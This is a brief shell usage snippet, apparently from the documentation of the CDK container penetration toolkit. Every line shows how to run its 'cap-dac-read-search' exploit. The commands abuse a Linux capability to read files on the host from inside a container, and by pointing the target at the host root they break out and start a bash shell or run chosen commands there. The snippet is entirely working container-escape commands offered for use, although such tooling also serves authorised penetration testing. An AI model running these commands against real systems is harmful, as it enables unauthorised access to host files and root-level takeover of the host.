```sh
# read file from host
$ ./cdk run cap-dac-read-search <target>

# specify bind mount point file path and read file
$ ./cdk run cap-dac-read-search /etc/hosts /tmp/pwn

# when target file is /, this exploit will chdir to host root and execute a command(default: /bin/bash)
$ ./cdk run cap-dac-read-search /etc/hosts /

# also you can specify what command to be executed, but cdk will recognize the string starting with'-' as its own option, so only some simple commands can be used
$ ./cdk run cap-dac-read-search /etc/hosts / cat /tmp/pwn
